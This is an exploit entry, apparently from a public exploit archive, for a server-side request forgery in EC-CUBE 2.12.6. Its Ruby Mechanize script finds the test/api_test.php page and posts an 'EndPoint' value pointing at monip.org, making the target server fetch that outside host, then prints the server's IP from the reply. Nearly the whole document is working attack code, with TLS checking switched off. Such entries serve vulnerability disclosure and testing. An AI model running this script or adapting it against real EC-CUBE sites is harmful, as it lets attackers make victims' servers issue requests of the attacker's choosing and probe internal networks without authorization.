# Exploit Title: EC-CUBE 2.12.6 Server-Side Request Forgery
# Date: 22/10/16
# Exploit Author: Wad Deek
# Vendor Homepage: http://en.ec-cube.net/
# Software Link: http://en.ec-cube.net/download/
# Version: 2.12.6en-p1
# Tested on: Xampp on Windows7
# Fuzzing tool: https://github.com/Trouiller-David/PHP-Source-Code-Analysis-Tools
##
##
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
require('mechanize')
agent = Mechanize.new()
agent.read_timeout = 3
agent.open_timeout = 3
agent.keep_alive = false
agent.redirect_ok = true
agent.agent.http.verify_mode = OpenSSL::SSL::VERIFY_NONE
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#===========================
urls = <<URLS
http://localhost/eccube/
URLS
urls.split("\n").each() do |url|
#===========================
#{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{
def get(agent, target)
begin
response = agent.get(target)
code = response.code()
body = response.body()
rescue
else
return code, body
end
end
#{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{
#}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
target = url+"test/api_test.php"
code, body = get(agent, target)
if(code == "200" && body.include?("EC-CUBE API TEST") == true)
begin
response = agent.post(
target,
{
"AccessKeyId" => 4111111111111111,
"arg_key0" => 1,
"arg_key1" => 1,
"arg_key2" => 1,
"arg_key3" => 1,
"arg_key4" => 1,
"arg_key5" => 1,
"arg_key6" => 1,
"arg_key7" => 1,
"arg_key8" => 1,
"arg_key9" => 1,
"arg_val0" => 1,
"arg_val1" => 1,
"arg_val2" => 1,
"arg_val3" => 1,
"arg_val4" => 1,
"arg_val5" => 1,
"arg_val6" => 1,
"arg_val7" => 1,
"arg_val8" => 1,
"arg_val9" => 1,
#????????????????????????????????????????????????????????????
"EndPoint" => "http://www.monip.org/index.php"+"?.jpg",
#????????????????????????????????????????????????????????????
"mode=" => "",
"Operation" => 1,
"SecretKey" => 1,
"Service" => 1,
"Signature" => 1,
"Timestamp" => 1,
"type" => "index.php"
})
body = response.body()
rescue
else
ip = response.body().scan(/IP : (.+?)</).join()
puts("[+] "+target+" >>>> monip.org >>>> "+ip)
end
end
#}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
#===========================
end
#===========================